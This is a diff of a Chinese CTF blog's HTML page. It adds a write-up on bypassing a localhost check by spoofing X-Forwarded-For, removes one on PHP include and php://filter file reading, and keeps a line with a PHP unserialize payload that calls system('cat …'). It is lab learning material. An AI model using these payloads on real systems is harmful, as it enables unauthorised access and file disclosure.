@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 13.33px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 10px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.67px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 13.33px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 10px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -300,6 +300,79 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-XFF构造" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/07/XFF%E6%9E%84%E9%80%A0/" class="article-date">
+  	<time datetime="2021-09-06T16:00:00.000Z" itemprop="datePublished">2021-09-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/07/XFF%E6%9E%84%E9%80%A0/">
+        XXF构造
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XXF构造"><a href="#XXF构造" class="headerlink" title="XXF构造"></a>XXF构造</h1><p>X-Forwarded-For</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For是一个http扩展头部，它是用来表示http请求端真实ip的，现在它已成为RFC 7239标准中</span><br></pre></td></tr></table></figure>
+
+<p>client-ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client-ip和X-Forwarded-For的功能相似，不过它是有使用的，不过它没有形成标准，所以不一定所有服务器可以实现</span><br></pre></td></tr></table></figure>
+
+<p>但我们打开页面后，发现要验证码才能读flag，不过我们再打开页面源码，发现有一段前端验证的js代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    function enc(code)&#123;</span><br><span class="line">      hash = hex_md5(code);</span><br><span class="line">      return hash;</span><br><span class="line">    &#125;</span><br><span class="line">    function validate()&#123;</span><br><span class="line">      var code = document.getElementById(&quot;vcode&quot;).value;</span><br><span class="line">      if (code != &quot;&quot;)&#123;</span><br><span class="line">        if(hex_md5(code) == &quot;0cd4da0223c0b280829dc3ea458d655c&quot;)&#123;</span><br><span class="line">          alert(&quot;您通过了验证！&quot;);</span><br><span class="line">          window.location = &quot;./flag.php&quot;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">          alert(&quot;你的授权码不正确！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">        alert(&quot;请输入授权码&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>思路是输入的验证码经过md5加密后，是等于0cd4da0223c0b280829dc3ea458d655c，所以进行md5解密就可以得到验证码，但发现不行，怀疑有后端验证，然后用工具去扫描，发现有flag.php文件，然后构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/flag.php</span><br></pre></td></tr></table></figure>
+<p>发现没有flag，只有叫我们再去验证的界面，不过有一句话让人深思，就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag</span><br></pre></td></tr></table></figure>
+<p>可知，我们可以抓包后，构造X-Forwarded-For来让服务端将我们的主机当成本地，所以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>就可以得到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li></ul>
 	</div>
 
       
@@ -1003,71 +1076,6 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unseraialize&amp;pO:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;cat 文件名&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
 <p>可以看见flag</p>
 
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-简单的include文件包含及php伪协议" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/03/%E7%AE%80%E5%8D%95%E7%9A%84include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8Aphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
-  	<time datetime="2021-09-02T16:00:00.000Z" itemprop="datePublished">2021-09-03</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/03/%E7%AE%80%E5%8D%95%E7%9A%84include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8Aphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
-        简单的include文件包含及php伪协议
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="简单的include文件包含及php伪协议"><a href="#简单的include文件包含及php伪协议" class="headerlink" title="简单的include文件包含及php伪协议"></a>简单的include文件包含及php伪协议</h1><p>打开页面，随便按下一个选项，发现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?category=woofers</span><br></pre></td></tr></table></figure>
-<p>然后猜测是sql注入或文件包含，然后我们使用php伪协议来读取文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>
-<p>读取源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　$file = $_GET[&#x27;category&#x27;];</span><br><span class="line">　　</span><br><span class="line">　　if(isset($file))</span><br><span class="line">　　&#123;</span><br><span class="line">　　　　if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;   //必须含有woofers或meowers或index字符串</span><br><span class="line">　　　　　　include ($file . &#x27;.php&#x27;);  //参数后拼接.php</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　　　else&#123;</span><br><span class="line">　　　　　　echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>所以只要输入有woofers或meowers或index就可以使用include()函数进行包含，因此使用php伪协议进行读取</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/woofers/resource=flag</span><br></pre></td></tr></table></figure>
       
     </div>
     
